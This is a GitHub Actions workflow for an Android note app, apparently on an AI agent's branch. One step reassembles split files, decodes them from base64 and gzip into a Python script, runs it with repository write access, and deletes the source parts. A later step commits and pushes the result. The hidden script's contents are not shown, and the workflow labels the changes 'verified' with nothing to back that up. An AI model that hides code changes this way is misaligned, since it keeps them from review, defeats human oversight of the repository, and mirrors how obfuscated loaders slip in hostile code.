name: Apply Ink Input Pipeline Fix

on:
  push:
    branches:
      - agent/note-app
  pull_request:
    branches:
      - main

permissions:
  contents: write

jobs:
  build-and-apply:
    if: github.event_name == 'push' || github.event.pull_request.head.repo.full_name == github.repository
    runs-on: ubuntu-latest
    timeout-minutes: 35

    steps:
      - uses: actions/checkout@v4
        with:
          ref: agent/note-app
          fetch-depth: 0

      - name: Apply verified input pipeline changes
        shell: bash
        run: |
          {
            head -c 8000 scripts/input_fix.part0
            cat scripts/input_fix.part1 scripts/input_fix.part2 scripts/input_fix.part3 scripts/input_fix.part4
          } | base64 -d | gzip -d > /tmp/apply_input_fix.py
          python /tmp/apply_input_fix.py
          rm -f scripts/input_fix.part*

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '17'

      - name: Set up Android SDK
        uses: android-actions/setup-android@v3

      - name: Install Android SDK 35
        run: sdkmanager 'platforms;android-35' 'build-tools;35.0.0'

      - name: Set up Gradle
        uses: gradle/actions/setup-gradle@v4
        with:
          gradle-version: '8.11.1'

      - name: Build and test
        shell: bash
        run: gradle :app:assembleDebug :app:testDebugUnitTest --stacktrace

      - name: Commit verified source
        shell: bash
        run: |
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add -A
          if git diff --cached --quiet; then
            echo 'No changes to commit.'
          else
            git commit -m 'Fix pinch zoom and unify ink input coordinates'
            git push origin HEAD:agent/note-app
          fi

      - name: Upload debug APK
        uses: actions/upload-artifact@v4
        with:
          name: note-0.6.0-debug-apk
          path: app/build/outputs/apk/debug/app-debug.apk
          if-no-files-found: error
